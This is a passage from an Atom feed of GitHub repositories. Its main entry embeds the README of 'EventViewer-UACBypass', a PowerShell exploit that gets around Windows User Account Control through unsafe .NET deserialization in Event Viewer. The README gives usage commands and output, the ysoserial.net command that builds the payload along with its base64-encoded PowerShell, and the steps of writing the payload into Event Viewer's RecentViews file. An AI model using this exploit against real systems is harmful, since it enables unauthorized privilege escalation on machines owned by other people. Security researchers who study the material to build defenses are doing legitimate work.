Agreement&lt;/h2&gt; &#xA;&lt;p&gt;To review our license agreement, please see &lt;a href=&#34;https://raw.githubusercontent.com/citrix/citrix-mcs-sdk-samples/main/LICENSE.txt&#34;&gt;LICENSE.txt&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>CsEnox/EventViewer-UACBypass</title>
    <updated>2024-04-10T01:34:16Z</updated>
    <id>tag:github.com,2024-04-10:/CsEnox/EventViewer-UACBypass</id>
    <link href="https://github.com/CsEnox/EventViewer-UACBypass" rel="alternate"></link>
    <summary type="html">&lt;p&gt;🍊 Orange Tsai EventViewer RCE&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;EventViewer-UACBypass&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;RCE through Unsafe .Net Deserialization in Windows Event Viewer which leads to UAC bypass.&lt;/li&gt; &#xA; &lt;li&gt;Full credits to &lt;a href=&#34;https://twitter.com/orange_8361&#34;&gt;Orange Tsai&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;Usage&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ps1&#34;&gt;PS C:\Windows\Tasks&amp;gt; Import-Module .\Invoke-EventViewer.ps1&#xA;&#xA;PS C:\Windows\Tasks&amp;gt; Invoke-EventViewer &#xA;[-] Usage: Invoke-EventViewer commandhere&#xA;Example: Invoke-EventViewer cmd.exe&#xA;&#xA;PS C:\Windows\Tasks&amp;gt; Invoke-EventViewer cmd.exe&#xA;[+] Running&#xA;[1] Crafting Payload&#xA;[2] Writing Payload&#xA;[+] EventViewer Folder exists&#xA;[3] Finally, invoking eventvwr&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;Working&lt;/h3&gt; &#xA;&lt;p&gt;i) First, the script adds commands to be run to the file &lt;code&gt;C:\Windows\Tasks\EventViewerRCE.ps1&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;Stop-Process -name mmc*&lt;/code&gt; : Is used to close Microsoft Management Console.&lt;/li&gt; &#xA; &lt;li&gt;After that the command to be executed is added.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;ii) Then it crafts payload which runs &lt;code&gt;C:\Windows\Tasks\EventViewerRCE.ps1&lt;/code&gt; script. The base64 payload was generated using &lt;a href=&#34;https://github.com/pwntester/ysoserial.net&#34;&gt;ysoserial.net&lt;/a&gt; :&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ps1&#34;&gt;ysoserial.exe -o base64 -f BinaryFormatter -g DataSet -c &#34;powershell.exe -nop -e UwBlAHQALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBTAGMAbwBwAGUAIABDAHUAcgByAGUAbgB0AFUAcwBlAHIAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXABFAHYAZQBuAHQAVgBpAGUAdwBlAHIAUgBDAEUALgBwAHMAMQA=&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The base64 output from ysoserial.net is decoded and stored in &lt;code&gt;C:\Windows\Tasks\p4yl0ad&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;The powershell encoded command decodes to :&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;Set-ExecutionPolicy Bypass -Scope CurrentUser; C:\Windows\Tasks\EventViewerRCE.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;iii) When &lt;code&gt;WriteFile&lt;/code&gt; function is executed, it checks if the &lt;code&gt;Event Viewer&lt;/code&gt; folder exists in AppData and it it doesn&#39;t then we create the folder. Finally storing our base64 decoded payload in &lt;code&gt;RecentViews&lt;/code&gt; file under this folder.&lt;/p&gt; &#xA;&lt;p&gt;iv) In the end, &lt;code&gt;eventvwr&lt;/code&gt; is executed which then executes our payload.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;Reference&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/orange_8361/status/1518970259868626944&#34;&gt;https://twitter.com/orange_8361/status/1518970259868626944&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>